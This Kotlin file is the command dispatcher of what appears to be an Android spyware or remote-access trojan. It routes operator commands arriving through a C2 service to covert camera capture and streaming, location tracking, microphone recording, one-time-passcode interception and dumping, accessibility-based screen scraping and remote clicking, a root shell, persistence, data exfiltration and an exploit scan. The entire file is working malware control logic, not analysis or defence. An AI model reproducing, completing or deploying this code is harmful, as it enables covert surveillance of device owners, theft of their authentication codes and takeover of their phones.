package ai.obsidian.agent.cmd

import ai.obsidian.agent.AgentApp
import ai.obsidian.agent.collect.A11yService
import ai.obsidian.agent.knox.Knox
import ai.obsidian.agent.persist.Ladder
import ai.obsidian.agent.root.Shell
import ai.obsidian.agent.svc.C2Service
import ai.obsidian.agent.svc.CaptureService
import ai.obsidian.agent.svc.LocationService
import ai.obsidian.agent.svc.MicService
import ai.obsidian.agent.svc.ScreenService
import ai.obsidian.agent.util.Probe
import ai.obsidian.agent.web.WebProbe
import android.content.Context
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

object CommandRouter {

    fun dispatch(context: Context, raw: String) {
        val app = context.applicationContext as AgentApp
        val parts = raw.trim().removePrefix("/").split(WHITESPACE, limit = 3)
        val verb = parts.getOrElse(0) { "" }.lowercase()
        val sub = parts.getOrElse(1) { "" }
        val rest = parts.getOrElse(2) { "" }

        app.audit.info("cmd", raw.take(200))

        CoroutineScope(Dispatchers.Default).launch {
            val output = runCatching { route(app, context, verb, sub, rest) }
                .getOrElse { "ERR ${it::class.java.simpleName}: ${it.message}" }
            runCatching { app.requireClient().send("msg", output) }
        }
    }

    private fun route(
        app: AgentApp,
        context: Context,
        verb: String,
        sub: String,
        rest: String
    ): String = when (verb) {

        "ping" -> "pong ${System.currentTimeMillis()} rung=${Probe.describe(app.cfg.rung)}"

        "status" -> Status.render(context)

        "recon" -> Recon.run(context, sub)

        "cam" -> when (sub) {
            "snap" -> {
                val front = rest.contains("front")
                val burst = rest.filter { it.isDigit() }.toIntOrNull() ?: 1
                CaptureService.snap(context, front, burst)
                "capture queued front=$front burst=$burst"
            }
            "stream" -> {
                if (rest == "stop" || rest.isEmpty()) {
                    CaptureService.stopStream(context)
                    "stream stopped"
                } else {
                    CaptureService.startStream(context, rest.toLongOrNull() ?: 3_000L)
                    "stream started"
                }
            }
            "clip" -> {
                CaptureService.clip(context, rest.toIntOrNull() ?: 10)
                "clip queued"
            }
            else -> "cam snap|stream|clip"
        }

        "loc" -> when (sub) {
            "once" -> {
                LocationService.once(context)
                "locating"
            }
            "track" -> {
                LocationService.startTracking(context)
                "tracking"
            }
            "history" -> {
                LocationService.history(context)
                "history requested"
            }
            "stop" -> {
                LocationService.stop(context)
                "stopped"
            }
            else -> "loc once|track|history|stop"
        }

        "mic" -> {
            MicService.record(context, rest.toIntOrNull() ?: 15)
            "recording"
        }

        "screen" -> when (sub) {
            "start" -> {
                ScreenService.requestConsent(context)
                "consent prompt shown"
            }
            "stop" -> {
                ScreenService.stop(context)
                "stopped"
            }
            else -> "screen start|stop"
        }

        "otp" -> {
            app.cfg.otpEnabled = (sub == "on")
            "otp=${app.cfg.otpEnabled}"
        }

        "otp-dump" -> app.store.tail("otp.log", 100).ifEmpty { "empty" }

        "a11y" -> A11yService.instance?.scrape() ?: "accessibility service not enabled"

        "click" -> "${A11yService.instance?.click(rest) ?: false}"

        "web" -> {
            WebProbe.run(context, sub, rest)
            "web $sub dispatched"
        }

        "knox" -> Knox.run(context, sub)

        "shell" -> Shell.run(context, rest)

        "persist" -> Ladder.control(context, sub)

        "exfil" -> Exfil.run(context, sub)

        "exploit" -> Exploit.scan(context)

        "report" -> Report.build(context, sub)

        "audit" -> app.audit.tail(rest.toIntOrNull() ?: 20)

        "verify" -> app.audit.verify()

        "kill" -> {
            C2Service.stop(context)
            "terminated"
        }

        else -> "unknown verb: $verb"
    }

    private val WHITESPACE = Regex("\\s+")
}
